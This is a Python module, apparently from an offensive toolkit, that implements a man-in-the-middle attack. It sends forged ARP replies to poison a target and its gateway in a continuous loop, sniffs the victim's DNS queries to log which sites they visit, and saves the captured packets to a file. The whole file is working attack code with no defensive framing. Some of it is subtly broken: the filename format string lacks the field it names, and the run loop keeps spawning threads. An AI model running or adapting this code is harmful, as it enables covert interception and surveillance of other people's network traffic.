#!/usr/bin/python
from scapy.layers.dns import DNS
from scapy.layers.l2 import ARP

try:
    from scapy.all import *
except ImportError:
    pass
import src.source.use
from src.Logging.print_stdout import print_process, print_error, print_warning

class ManInTheMiddle_Attack:
    def __init__(self, hostname, gateway, interfaces):
        self.ip_address = hostname
        self.gateway = gateway
        self.interfaces = interfaces
        if not self.ip_address:
            print_warning("Please input the ip target you!")
            exit(0)
        if not self.gateway:
            print_warning("Please input the gateway!")
            exit(0)
        if not self.interfaces:
            print_warning("Please input your interfaces!")
            exit(0)

    def dns_handler(self, pkt):
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            print_process(
                    "Victim: {ip} has searched for: {site}".format(
                    ip=self.ip_address, 
                    site=pkt.getlayer(DNS).qd.name
                )
            )

    def v_poison(self):
        v = ARP(pdst=self.ip_address, psrc=self.gateway)
        while True:
            try:
                send(v, verbose=0, inter=2, loop=1)
            except KeyboardInterrupt:
                exit(1)

    def gateway_poison(self):
        gateway = ARP(pdst=self.gateway, psrc=self.ip_address)
        while True:
            try:
                send(gateway, verbose=0, inter=2, loop=1)
            except KeyboardInterrupt:
                exit(0)


    def run(self):
        v_thread = []
        gw_thread = []
        try:
            while True:
                try:
                    v_poison = threading.Thread(target=self.v_poison)
                    v_poison.setDaemon(True)
                    v_thread.append(v_poison)
                    v_poison.start()

                    gw_poison = threading.Thread(target=self.gateway_poison)
                    gw_poison.setDaemon(True)
                    gw_thread.append(gw_poison)
                    gw_poison.start()

                    packets = sniff(iface=self.interfaces, filter="udp port 53", prn=self.dns_handler)
                    wrpcap("output/{time}.cap".format(src.source.use.time.strftime("%H-%M-%S")), packets)
                except KeyboardInterrupt:
                    exit(1)
        except KeyboardInterrupt:
            print_error("Exiting...")
            exit(0)
